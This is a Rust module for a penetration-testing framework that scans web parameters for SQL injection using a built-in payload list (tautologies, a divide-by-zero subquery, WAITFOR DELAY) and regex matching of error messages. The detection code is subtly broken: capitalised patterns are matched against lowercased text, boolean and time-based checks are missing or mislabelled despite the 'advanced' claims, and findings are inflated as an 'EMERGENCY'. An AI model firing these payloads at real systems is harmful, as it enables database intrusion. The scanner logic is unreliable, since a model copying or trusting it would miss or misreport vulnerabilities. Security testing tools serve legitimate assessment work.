//! SQL Injection Scanner Module
//! Detects SQL injection vulnerabilities in web applications
//! using boolean-based and error-based detection techniques

use async_trait::async_trait;
use regex::Regex;
use reqwest::Client;
use std::time::Duration;
use tokio::time::timeout;

use crate::core::module_handler::Module;
use crate::utils::theme;
use crate::utils::helpers::extract_option;

/// SQL Injection scanner with advanced detection capabilities
pub struct SQLInjectionScanner {
    default_target: String,
    test_parameters: Vec<String>,
}

impl Default for SQLInjectionScanner {
    fn default() -> Self {
        SQLInjectionScanner {
            default_target: String::from("http://testphp.vulnweb.com"),
            test_parameters: vec![
                "id".to_string(),
                "product".to_string(),
                "category".to_string(),
                "user".to_string(),
                "search".to_string(),
            ],
        }
    }
}

#[async_trait]
impl Module for SQLInjectionScanner {
    fn name(&self) -> &'static str {
        "auxiliary/http_sql_injection"
    }

    fn description(&self) -> &'static str {
        "Advanced SQL injection scanner detecting vulnerabilities using boolean-based and error-based techniques"
    }

    fn author(&self) -> &'static str {
        "Chthonic Security Team"
    }

    fn version(&self) -> &'static str {
        "1.0.0"
    }

    async fn run(&self, options: &[(String, String)]) -> Result<String, String> {
        let target_url = extract_option(options, "RHOSTS")
            .map(|s| s.as_str())
            .unwrap_or(&self.default_target);

        println!("{}", theme::info(&format!("Target: {}", target_url)));
        println!("{}", theme::info("Starting SQL injection scan..."));
        println!("{}", theme::warning("This may take 2-3 minutes..."));

        let client = Client::builder()
            .timeout(Duration::from_secs(5))
            .user_agent("Chthonic-SQLi-Scanner/1.0")
            .build()
            .map_err(|e| format!("HTTP client error: {}", e))?;

        let mut vulnerabilities = Vec::new();

        // Test each parameter with SQL injection payloads
        for parameter in &self.test_parameters {
            println!("{}", theme::info(&format!("Testing parameter: {}", parameter)));
            
            let payloads = vec![
                // Basic SQL injection probes
                "'",
                "\"",
                "`",
                "')",
                "\")",
                "`)",
                
                // Boolean-based detection
                "' OR '1'='1",
                "' OR 1=1--",
                "\" OR \"1\"=\"1",
                
                // Error-based detection
                "' AND (SELECT 1/0 FROM DUAL)--",
                "'; WAITFOR DELAY '0:0:5'--",
            ];

            for payload in payloads {
                if let Ok(result) = test_sql_injection(&client, target_url, parameter, payload).await {
                    if result.vulnerable {
                        let vuln_info = format!("Parameter '{}' with payload '{}' - {}", parameter, payload, result.evidence);
                        vulnerabilities.push(vuln_info);
                        println!("{}", theme::error(&format!("SQLi Found: {} = {}", parameter, payload)));
                    }
                }
            }
        }

        if vulnerabilities.is_empty() {
            println!("{}", theme::success("No SQL injection vulnerabilities detected"));
            Ok("Scan completed - No SQLi vulnerabilities found".to_string())
        } else {
            println!("{}", theme::error(&format!("🚨 CRITICAL: {} SQLi vulnerabilities found!", vulnerabilities.len())));
            for vuln in &vulnerabilities {
                println!("{}", theme::warning(&format!("  • {}", vuln)));
            }
            Ok(format!("🚨 EMERGENCY: {} SQL injection vulnerabilities detected", vulnerabilities.len()))
        }
    }
}

/// Result structure for SQL injection tests
#[derive(Debug)]
struct SQLInjectionResult {
    parameter: String,
    payload: String,
    evidence: String,
    vulnerable: bool,
}

/// Tests a specific parameter for SQL injection vulnerabilities
async fn test_sql_injection(
    client: &Client,
    url: &str,
    parameter: &str,
    payload: &str,
) -> Result<SQLInjectionResult, String> {
    let mut params = std::collections::HashMap::new();
    params.insert(parameter, payload);

    let response = timeout(
        Duration::from_secs(8),
        client.get(url).query(&params).send()
    ).await
    .map_err(|_| "Request timeout".to_string())?
    .map_err(|e| format!("Request failed: {}", e))?;

    let status = response.status();
    // تم إزالة المتغير غير المستخدم: let headers = response.headers().clone();
    let body = response.text().await
        .map_err(|e| format!("Failed to read response: {}", e))?;

    // Common SQL error patterns for detection
    let error_patterns = vec![
        r"SQL.*syntax", r"MySQL.*error", r"ORA-[0-9]{5}", 
        r"PostgreSQL.*ERROR", r"SQLite.*error", r"Unclosed.*quotation",
        r"quoted.*string", r"SELECT.*FROM", r"UNION.*SELECT",
        r"Warning.*mysql", r"Microsoft.*ODBC", r"Driver.*SQL",
    ];

    let mut evidence = String::new();
    let mut vulnerable = false;

    // Check for SQL error messages in response body
    for pattern in error_patterns {
        let re = Regex::new(pattern).map_err(|e| format!("Regex error: {}", e))?;
        if re.is_match(&body.to_lowercase()) {
            evidence = format!("SQL error detected: {}", pattern);
            vulnerable = true;
            break;
        }
    }

    // Check for boolean-based detection (different responses)
    if !vulnerable {
        // TODO: Implement boolean-based detection by comparing with original request
        evidence = "Boolean-based detection pending implementation".to_string();
    }

    // Check for time-based detection (delayed responses)
    if status.is_server_error() && body.contains("SQL") {
        evidence = "Server error with SQL reference".to_string();
        vulnerable = true;
    }

    Ok(SQLInjectionResult {
        parameter: parameter.to_string(),
        payload: payload.to_string(),
        evidence: if vulnerable { evidence } else { "No SQL errors detected".to_string() },
        vulnerable,
    })
}